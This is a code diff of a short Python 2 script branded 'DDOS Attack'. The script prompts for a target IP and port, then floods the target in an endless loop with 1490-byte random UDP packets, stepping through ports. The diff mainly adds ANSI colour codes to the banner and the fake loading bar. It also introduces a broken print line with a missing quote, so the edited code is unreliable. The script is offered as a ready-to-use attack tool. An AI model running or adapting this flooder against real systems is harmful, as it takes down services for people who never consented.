@@ -11,7 +11,8 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
-
+yellow = '\033[93m'
+grn = '\033[1;92m'
 ##############
 reg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 load = random._urandom(1490)
@@ -19,32 +20,32 @@ load = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDOS Attack | lolcat")
-print ("author      :  ANONYMOUS")
-print ("website     :  https://dev-regaanthamimprogramming.pantheonsite.io")
-print ("You Tube    :  https://www.youtube.com/channel/UCpKJnmkqAYVqLbl3ZWhh4yA")
-print ("github      :  https://github.com/noobforanonymous")
+print (yellow + "author      :  ANONYMOUS" + yellow)
+print (yellow + "website     :  https://dev-regaanthamimprogramming.pantheonsite.io" + yellow)
+print (yellow + "You Tube    :  https://www.youtube.com/channel/UCpKJnmkqAYVqLbl3ZWhh4yA" + yellow)
+print (yellow + "github      :  https://github.com/noobforanonymous" + yellow)
 
 rt = raw_input("Enter Your Target IP : ")
 hack = input("Enter Any Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Started  |  lolcat")
-print ("[                    ] wait 0% loading")
+print (grn + "[                    ] wait 0% loading" + grn)
 time.sleep(5)
-print ("[=====               ] wait 25% loading")
+print (grn + "[=====               ] wait 25% loading" + grn)
 time.sleep(5)
-print ("[==========          ] wait 50% loading")
+print (grn + "[==========          ] wait 50% loading" + grn)
 time.sleep(5)
-print ("[===============     ] wait 75% loading")
+print (grn + "[===============     ] wait 75% loading" + grn)
 time.sleep(5)
-print ("[====================] Now 100% Completed to start attacking")
+print (grn + "[====================] Now 100% Completed to start attacking" + grn)
 time.sleep(3)
 send = 0
 while True:
      reg.sendto(load, (rt,hack))
      send = send + 1
      hack = hack + 1
-     print "Send %s packet to %s throught port:%s"%(send,rt,hack)
+     print end %s packet to %s throught port:%s"%(send,rt,hack)
      if hack == 65534:
        hack = 1
 
